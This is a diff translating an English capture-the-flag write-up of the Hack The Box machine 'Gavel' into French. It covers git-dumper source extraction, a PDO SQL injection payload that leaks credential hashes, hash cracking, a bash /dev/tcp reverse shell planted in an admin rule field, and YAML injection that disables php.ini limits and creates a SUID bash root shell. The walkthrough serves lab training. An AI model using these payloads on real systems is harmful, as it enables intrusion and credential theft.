@@ -16,15 +16,15 @@ type: "post"
 * OS: Linux
 ---
 
-Gavel starts with the enumeration of an exposed `.git` repository, which provides access to the application source code. Further analysis uncovers a structural SQL injection in a PDO query, allowing extraction of administrator credentials. With admin access, a vulnerable dynamic rule mechanism in the admin panel is abused to achieve remote code execution and gain an initial shell. Subsequent system enumeration reveals a privileged binary tied to this functionality, which is leveraged to disable PHP security controls and escalate privileges to root by tampering with the bash binary.
+Gavel débute par l’énumération d’un dépôt `.git` exposé, permettant d’accéder au code source de l’application. Une analyse approfondie met ensuite en évidence une injection SQL structurelle dans une requête PDO, permettant l’extraction des identifiants administrateur. Après authentification en tant qu’administrateur, un mécanisme de règles dynamiques vulnérable présent dans le panneau d’administration est exploité afin d’obtenir une exécution de code à distance et un premier shell sur la machine. L’énumération du système révèle par la suite l’existence d’un binaire privilégié lié à ce mécanisme, qui est utilisé pour désactiver les contrôles de sécurité PHP et élever les privilèges jusqu’à root en altérant le binaire bash.
 
-# Scanning
+# Balayage
 
 ```
 nmap -sC -sV -oA nmap/Gavel {TARGET_IP}
 ```
 
-**Results**
+**Résultats**
 ```shell
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 09:50 EDT
 Nmap scan report for 10.129.8.19 (10.129.8.19)
@@ -45,37 +45,37 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
 ```
 
-Two open ports discovered:
-- 22 - SSH with `OpenSSH 8.9p1`
-- 80 - http with `Apache 2.4.52` and a redirection to `gavel.htb`
+Deux ports ouverts ont été détectés :
+* 22 - SSH avec `OpenSSH 8.9p1`
+* 80 - HTTP avec `Apache 2.4.52` et une redirection vers `gavel.htb`
 
 ```
 sudo echo "{IP} gavel.htb" | sudo tee -a /etc/hosts
 ```
 
-# Enumeration
+# Énumération
 
-At `http://gavel.htb/` we find an auction website offering virtual goods.
+À l'adresse `http://gavel.htb/`, on trouve un site d'enchères proposant des biens virtuels.
 
 ![Gavel website](/images/HTB-Gavel/gavel_website.png)
 
-The website also has some authentication features. 
+Le site web propose également des fonctionnalités d'authentification. 
 
 ![Gavel sign up page](/images/HTB-Gavel/gavel_register.png)
 
-After creating an account and logging in we have access to more features.
+Après avoir créé un compte et nous être connectés, nous avons accès à davantage de fonctionnalités.
 
 ![Gavel account features](/images/HTB-Gavel/gavel_features.png)
 
-The `inventory` option leads to `http://gavel.htb/inventory.php`.
+L'option `Inventory` redirige vers `http://gavel.htb/inventory.php`.
 
 ![Gavel inventory](/images/HTB-Gavel/gavel_inventory.png)
 
-The `bidding` button leads to `http://gavel.htb/bidding.php`.
+Le bouton `Bidding` redirige vers `http://gavel.htb/bidding.php`.
 
 ![Gavel bidding](/images/HTB-Gavel/gavel_bidding.png)
 
-We continue the enumeration with some directory brute forcing.
+Nous poursuivons l'énumération par une attaque par force brute sur les répertoires.
 
 ```
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb
@@ -83,11 +83,11 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://g
 
 ![Gobuster command](/images/HTB-Gavel/gavel_gobuster.png)
 
-We find multiple interesting directories:
+Nous trouvons plusieurs répertoires intéressants:
 - `.git`
 - `admin.php`
 
-We extract the `.git` directory using [git-dumper](https://github.com/arthaud/git-dumper).
+Nous extrayons le répertoire `.git` à l'aide de [git-dumper](https://github.com/arthaud/git-dumper).
 
 ```
 python3 -m venv myvenv
@@ -99,23 +99,23 @@ pip install git-dumper
 git-dumper http://gavel.htb/.git/ git_gavel
 ```
 
-## SQL Injection Identification
+## Détection d'injection SQL
 
-In vscode we analyze the different files and identify some vulnerable code.
+Nous analysons les différents fichiers et identifions certains passages de code vulnérables.
 
 ![SQLi in source code](/images/HTB-Gavel/gavel_sqli_code.png)
 
-The application uses PDO (PHP Data Objects) prepared statements. However the `sort` and `user_id` parameter are directly accepted in the URL. Without satisfactory input sanitization this can lead to an SQL injection vulnerability.  [Here](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements), we learn how to exploit SQLis in PDO prepared statements.
+L'application utilise des requêtes préparées PDO (PHP Data Objects). Cependant, les paramètres `sort` et `user_id` sont directement acceptés dans l'URL. En l'absence d'un filtrage adéquat des données saisies, cela peut entraîner une vulnérabilité de type injection SQL. [Sur ce site](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements), nous apprenons comment exploiter les failles SQLi dans les requêtes préparées PDO.
 
-The `bid_handler.php` logic retrieves the `rule` field from the `auctions` table and passes it directly into `runkit_function_add()` as the body of a dynamically generated `ruleCheck()` function. Since this function is executed immediately afterward, control over the `rule` field translates directly into arbitrary PHP code execution.
+La logique de `bid_handler.php` récupère le champ `rule` depuis la table `auctions` et le transmet directement à `runkit_function_add()` comme corps d’une fonction `ruleCheck()` générée dynamiquement. Étant donné que cette fonction est exécutée immédiatement après sa création, le contrôle du champ `rule` se traduit directement par une exécution arbitraire de code PHP.
 
 ![bid_handler code](/images/HTB-Gavel/bid_handler.png)
 
-As displayed below the inventory of the created account displays some content after winning an auction.
+Comme indiqué ci-dessous, l'inventaire du compte créé affiche certains éléments après avoir remporté une enchère.
 
 ![Gavel inventory items](/images/HTB-Gavel/gavel_inventory.png)
 
-Following the article, we test the vulnerability with the specified payloads.
+Conformément à l'article, nous testons la vulnérabilité à l'aide des payloads spécifiés.
 
 ```
 # 1st Payload: ?#\0
@@ -126,39 +126,39 @@ Following the article, we test the vulnerability with the specified payloads.
 http://gavel.htb/inventory.php?sort=%3f%23%00&user_id=x%60;%23
 ```
 
-Under normal conditions the inventory displays items belonging to the created account. However when injecting the crafted payloads the application returns an empty inventory. This proves that the underlying SQL query logic has been altered.
+Dans des conditions normales, l'inventaire affiche les objets appartenant au compte créé. Cependant, lors de l'injection des payloads, l'application renvoie un inventaire vide. Cela prouve que la logique de la requête SQL sous-jacente a été altérée.
 
 ![Gavel empty directory](/images/HTB-Gavel/inventory_empty.png)
 
-Next we use the SQLi payload.
+Nous utilisons ensuite la payload SQLi (SQL injection) .
 ```
 http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&
 ```
 
-The payload performs different tasks:
-- the `sort` parameter injects a backlash-escaped placeholder (`?`) followed by a comment sequence:
+Il exécute différentes tâches:
+- Le paramètre `sort` injecte un placeholder (`?`) échappé par un antislash, suivi d’une séquence de commentaire.
 ```
 sort=\?;-- -
 ```
-The sequence breaks the PDO's parsing and effectively truncates the remainder of the intended query.
-- The result is the `user_id` parameter supplies a nested query:
+Cette séquence interrompt l'analyse syntaxique du PDO et tronque de facto le reste de la requête prévue.
+- Il en résulte que le paramètre `user_id` génère une requête imbriquée:
 ```
 x` FROM (
     SELECT group_concat(username,0x3a,password) AS `x`
     FROM users
 )y;-- -
 ```
-By closing the backtick context and injecting a derived query that aggregates `username:hash` values, the payload forces the database to return credential data as part of the inventory result set. Commenting out the remaining query ensures successful execution, confirming full SQL injection through structural manipulation of the prepared statement.
+En fermant le contexte des backticks et en injectant une requête dérivée qui agrège les valeurs `username:hash`, le payload force la base de données à renvoyer des données d’identification dans le contenu de l’inventaire. Le fait de commenter le reste de la requête garantit une exécution réussie, confirmant une injection SQL complète par manipulation structurelle de la requête préparée.
 
 
 ![leaked database data](/images/HTB-Gavel/gavel_pwd_hashes.png)
 
-The password hash of `auctioneer` is returned.
+Le hachage du mot de passe de l'utilisateur `auctioneer` est renvoyé.
 ```
 auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
 ```
 
-We crack it and retrieve the password `midnight1`.
+Nous le déchiffrons et obtenons le mot de passe `midnight1`.
 
 ```
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -166,29 +166,29 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 ![auctioneer password](/images/HTB-Gavel/auctioner_pwd.png)
 
-We login with the newly found credentials. We now have access to the `Admin Panel`.
+Nous nous connectons avec les identifiants nouvellement obtenus. Nous avons désormais accès au panneau d'administration (`Admin Panel`).
 
 ![auctioneer login](/images/HTB-Gavel/auctioneer_login.png)
 
-# Initial Foothold
+# Accès initial
 
-In the `Admin Panel` we can add rules to the different auctions items.
+Dans `Admin Panel`, nous pouvons ajouter des règles aux différents articles mis aux enchères.
 
 ![admin panel rules](/images/HTB-Gavel/admin_panel_rule.png)
 
-As we saw earlier these rules are processed by `runkit_function_add()` leading to the execution of code on the server.
+Comme nous l'avons vu précédemment, ces règles sont traitées par la fonction `runkit_function_add()`, ce qui entraîne l'exécution de code sur le serveur.
 
-So our exploitation is in four steps:
+Notre exploitation se déroule donc en quatre étapes:
 
-1. Place a bid as auctioneer.
+1. Enchérir en tant que `auctioneer`
 
 ![admin panel rules](/images/HTB-Gavel/gavel_place_bid.png)
 
 
-2. Get the `auction_id` parameter values.
+2. Récupérez les valeurs du paramètre `auction_id`
 
-> We know that `auction_id` is the parameter used because it is present in the page source code. It is also observable in the requests if Burp is used. 
-> Since every auction is time-limited and linked to a unique auction_id, the exploitation steps must be carried out before the auction expires, after which the identifier is no longer valid.
+> Nous savons que `auction_id` est le paramètre utilisé, car il figure dans le code source de la page. Il est également visible dans les requêtes si l'on utilise Burp.
+> Étant donné que chaque enchère est limitée dans le temps et associée à un identifiant unique (`auction_id`), les étapes de l'exploitation doivent êtres réalisées avant l'expiration de l'enchère, après quoi cet identifiant n'est plus valide.
 
 ```
 curl -s http://gavel.htb/bidding.php -H 'Cookie: gavel_session=COOKIE_VALUE' | grep 'auction_id'
@@ -196,7 +196,7 @@ curl -s http://gavel.htb/bidding.php -H 'Cookie: gavel_session=COOKIE_VALUE' | g
 
 ![Get auction IDs](/images/HTB-Gavel/auction_IDs.png)
 
-3. Add a RCE command as a rule.
+3. Ajoutez une commande RCE en tant que règle.
 
 ```
 system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"'); return true;
@@ -205,7 +205,7 @@ system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"'); return true
 ![RCE command as rule](/images/HTB-Gavel/rule_RCE.png)
 
 
-4. Trigger RCE payload
+4. Déclencher la payload RCE
 
 ```
 curl -X POST http://gavel.htb/includes/bid_handler.php \
@@ -215,26 +215,26 @@ curl -X POST http://gavel.htb/includes/bid_handler.php \
   ```
 ![RCE trigger](/images/HTB-Gavel/rule_rce_trigger.png)
 
-On our listener we get a shell as `www-data`.
+Sur notre listener, nous obtenons un shell sous le nom d'utilisateur `www-data`.
 
 ![Foothold on the Gavel machine](/images/HTB-Gavel/gavel_foothold.png)
 
-Checking `/etc/passwd` confirms the presence of the `auctioneer` user. The password we use on the web application is valid for the user account.
+En consultant le fichier `/etc/passwd`, on constate que l'utilisateur `auctioneer` existe bien. Le mot de passe que nous avons utilisé sur l'application Web est valide pour ce compte utilisateur.
 
 ![Gavel user flag](/images/HTB-Gavel/gavel_user_flag.png)
 
-## Exploitation Explained
+## Explication de l'exploitation
 
-This exploitation process works because the bid flow executes the auction’s `rule` field as PHP code whenever a bid is submitted.
+Cette faille fonctionne parce que l'application exécute le contenu du champ `rule` de l'enchère en tant que code PHP chaque fois qu'une enchère est soumise.
 
-When we send a POST request to `includes/bid_handler.php`, the application:
+Lorsque nous envoyons une requête POST à `includes/bid_handler.php`, l'application :
 
-1. loads the auction row for the supplied `auction_id`
-2. reads the `rule` value from that auction
-3. uses `runkit_function_add()` to turn that rule into a live PHP function
-4. immediately calls that function to decide whether the bid is allowed
+1. charge la ligne d'enchère correspondant à l'`auction_id` fourni
+2. lit la valeur de la `rule` de cette enchère
+3. utilise `runkit_function_add()` pour transformer cette règle en une fonction PHP active
+4. invoque immédiatement cette fonction afin de déterminer si l'enchère est autorisée
 
-Going back to the vulnerable code:
+Revenons au code vulnérable:
 ```PHP
 $rule = $auction['rule'];
 
@@ -245,12 +245,12 @@ runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
 $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
 ```
 
-When we change the rule field to:
+Lorsque nous modifions le champ `rule` comme suit:
 ```
 system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1"'); return true;
 ```
 
-The application runs and builds:
+L’application s’exécute et construit:
 ```PHP
 function ruleCheck($current_bid, $previous_bid, $bidder) {
     system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1"');
@@ -258,35 +258,35 @@ function ruleCheck($current_bid, $previous_bid, $bidder) {
 }
 ```
 
-And this is why our reverse shell command triggers when we place a bid.
+C’est la raison pour laquelle notre commande de reverse shell s'exécute lorsque nous plaçons et remportons une enchère en tant que `auctioneer`.
 
-In a nutshell the exploit succeeds because `bid_handler.php` treats the `rule` database field as PHP code. Submitting a bid causes the application to compile that field into a runtime function via `runkit_function_add()` and execute it. By storing a reverse-shell command in the rule body, the bid submission directly triggers remote code execution.
+En résumé, l’exploitation réussit parce que `bid_handler.php` traite le champ `rule` de la base de données comme du code PHP. Lorsqu’une enchère est soumise, l’application compile ce champ en une fonction exécutée à l’exécution via `runkit_function_add()`, puis l’exécute. En intégrant une commande de shell inversé dans le corps de la règle, l'application déclenche l'exécution de code à distance à la fin de l'enchère.
 
-> Our payload only works because PHP is allowed to call `system()`. 
+> Notre payload fonctionne uniquement parce que PHP est autorisé à appeler system().
 
-# Privilege Escalation
+# Élévation des privilèges
 
-In `/opt/gavel/` we find:
+Dans `/opt/gavel/`, nous trouvons:
 
-- `gaveld` - a binary file we cannot executes
-- `.config` - the PHP config directory (`php.ini` is further in `/opt/gavel/.config/php/)`
-- we cannot access the `submission` directory and `sample.yaml` displays the structure for an auction item.
+- `gaveld` - un fichier binaire que nous ne pouvons pas exécuter
+- `.config` - le répertoire de configuration PHP (`php.ini` se trouve plus loin, dans `/opt/gavel/.config/php/)
+- nous ne pouvons pas accéder au répertoire `submission` et `sample.yaml` affiche la structure d'un article mis aux enchères.
 
 ![opt directory content](/images/HTB-Gavel/Gavel_opt.png)
 
 ![sample YAML file](/images/HTB-Gavel/sample_yaml.png)
 
-In `/usr/local/bin` we find `gavel-util`, another binary file we can execute. We can supply a YAML file in order to submit new auction items.
+Dans `/usr/local/bin`, on trouve `gavel-util`, un autre fichier binaire que l'on peut exécuter. Il accepte un fichier YAML afin de soumettre de nouveaux lots aux enchères.
 
 ![gavel_util file](/images/HTB-Gavel/gavel_util.png)
 
-Running `systemctl list-units --type=service --state=running` we can see the `gaveld.service` running as root.
+En exécutant la commande `systemctl list-units --type=service --state=running`, on constate que le service `gaveld.service` s'exécute en tant que root.
 
 ![gaveld service](/images/HTB-Gavel/gaveld_service.png)
 
-Once again we abuse the `rule` field to escalate our privileges to root. In `sample.yaml` we see that the `rule` field is used. We will use a YAML injection attack but first we start by disabling a few PHP restrictions:
+Une fois de plus, nous exploitons le champ `rule` pour élever nos privilèges au niveau root. Dans `sample.yaml`, nous voyons que le champ `rule` est utilisé. Nous allons mener une attaque par injection YAML, mais nous commençons par désactiver certaines restrictions PHP :
 
-> The picture below is the original php.ini file.
+> L'image ci-dessous montre le fichier php.ini d'origine.
 
 ![original php.ini file](/images/HTB-Gavel/phi_ini_OG.png)
 
@@ -299,20 +299,20 @@ echo 'rule_msg: "newini"' >> new_ini.yaml
 echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> new_ini.yaml
 ```
 
-We subnit the file.
+Nous soumettons le fichier.
 ```
 /usr/local/bin/gavel-util submit /home/auctioneer/new_ini.yaml
 ```
 
 ![YAML file to disable PHP restrictions](/images/HTB-Gavel/new_ini.png)
 
-After waiting a few seconds for the YAML file to be processed, we check `php.ini` again, it now has way less restrictions. We removed two major restrictions:
-* `open_basedir=/opt/gavel` - it limits which directories PHP scripts are allowed to access.
-* `disable_functions` - it blocks the execution of various dangerous PHP functions, by setting it to an empty list we basically allow all of them. 
+Après avoir attendu quelques secondes pour que le fichier YAML soit traité, nous vérifions à nouveau le fichier `php.ini` : il comporte désormais beaucoup moins de restrictions. Nous avons supprimé deux restrictions majeures:
+* `open_basedir=/opt/gavel` - cette option limite les répertoires auxquels les scripts PHP sont autorisés à accéder.
+* `disable_functions` - cette option bloque l'exécution de diverses fonctions PHP dangereuses ; en la définissant avec une liste vide, nous les autorisons pratiquement toutes.  
 
 ![modified php.ini file](/images/HTB-Gavel/modified_php-ini.png)
 
-Now we submit another YAML file to modify bash binary.
+Nous soumettons à présent un autre fichier YAML afin de modifier le binaire bash.
 
 ```
 echo 'name: gavelroot' > gavelroot.yaml
@@ -323,7 +323,7 @@ echo 'rule_msg: "rootshell"' >> gavelroot.yaml
 echo "rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;" >> gavelroot.yaml
 ```
 
-Submit the YAML file
+Soumission du fichier YAML
 ```
 /usr/local/bin/gavel-util submit /home/auctioneer/gavelroot.yaml
 ```
@@ -332,11 +332,11 @@ Submit the YAML file
 ls -lh /opt/gavel/
 ```
 
-We now have a copy of teh bash binary with the SUID bit set.
+Nous disposons désormais d'une copie du binaire bash avec le bit SUID activé.
 
 ![Gavel SUID bash](/images/HTB-Gavel/gavel_SUID_bash.png)
 
-We spawn a root shell and read the root flag.
+Nous lançons un shell root et lisons le drapeau root.
 ```
 /opt/gavel/rootbash -p
 ```
